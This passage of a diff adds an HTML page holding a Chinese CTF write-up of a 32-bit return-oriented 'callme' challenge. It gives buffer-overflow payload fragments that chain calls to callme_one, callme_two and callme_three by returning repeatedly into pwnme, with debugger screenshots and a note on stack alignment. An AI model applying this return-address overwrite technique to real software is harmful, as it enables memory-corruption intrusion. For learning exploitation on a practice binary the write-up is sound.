+<span class="c1"># 我把 callme_one 的返回地址覆盖成 pwnme 在调用完 callme_one 又会跳回 pwnme，进行第二次溢出</span>
+</pre></div>
+</div>
+<p><img alt="image-20200430180442457" src="../_images/image-20200430180442457.png" /></p>
+<p>在 <code class="docutils literal notranslate"><span class="pre">callme_one</span></code> 准备 <code class="docutils literal notranslate"><span class="pre">ret</span></code>时：</p>
+<p><img alt="image-20200430180734801" src="../_images/image-20200430180734801.png" /></p>
+<p>在 <code class="docutils literal notranslate"><span class="pre">pwnme</span></code> 的 <code class="docutils literal notranslate"><span class="pre">ret</span></code> 下断点，继续运行</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 第二次溢出</span>
+<span class="n">exp0</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">44</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">callme_two_plt</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
+<span class="c1"># 我把 callme_two 的返回地址覆盖成 pwnme 在调用完 callme_two 又会跳回 pwnme，进行第三次溢出</span>
+</pre></div>
+</div>
+<p><img alt="image-20200430180956444" src="../_images/image-20200430180956444.png" /></p>
+<p>可以看到第二次溢出运行了 <code class="docutils literal notranslate"><span class="pre">callme_two</span></code></p>
+<p>在  <code class="docutils literal notranslate"><span class="pre">callme_two</span></code> 的 <code class="docutils literal notranslate"><span class="pre">ret</span></code> 下断点</p>
+<p><img alt="image-20200430181213725" src="../_images/image-20200430181213725.png" /></p>
+<p>看到吗，又跳回 <code class="docutils literal notranslate"><span class="pre">pwnme</span></code></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1">#第三次溢出</span>
+<span class="n">exp1</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">44</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">callme_three_plt</span><span class="p">)</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdead</span><span class="p">)</span>
+<span class="c1"># 我把 callme_two 的返回地址覆盖成 0xdead 在调用完 callme_three 我们的目的就达到了，无所谓程序会执行到哪里</span>
+</pre></div>
+</div>
+<p><img alt="image-20200430181312838" src="../_images/image-20200430181312838.png" /></p>
+<p>第三次溢出，调用 <code class="docutils literal notranslate"><span class="pre">callme_three</span></code></p>
+<p><img alt="image-20200430181416515" src="../_images/image-20200430181416515.png" /></p>
+<p>pwn！</p>
+<p>其实在进行第二次调用 pwnme 时要注意 栈对齐，填充的长度不一定是跟第一次溢出是一样</p>
+<p>这是x86_64 的栈对齐：https://www.cnblogs.com/tcctw/p/11333743.html</p>
+<p>照猫画虎吧，懒得找 x86 的，或者自己搜</p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; 版权所有 2021, scriptk1d.</p>
+  </div>
+
+  利用 <a href="https://www.sphinx-doc.org/">Sphinx</a> 构建，使用了 
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">主题</a>
+    由 <a href="https://readthedocs.org">Read the Docs</a>开发.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
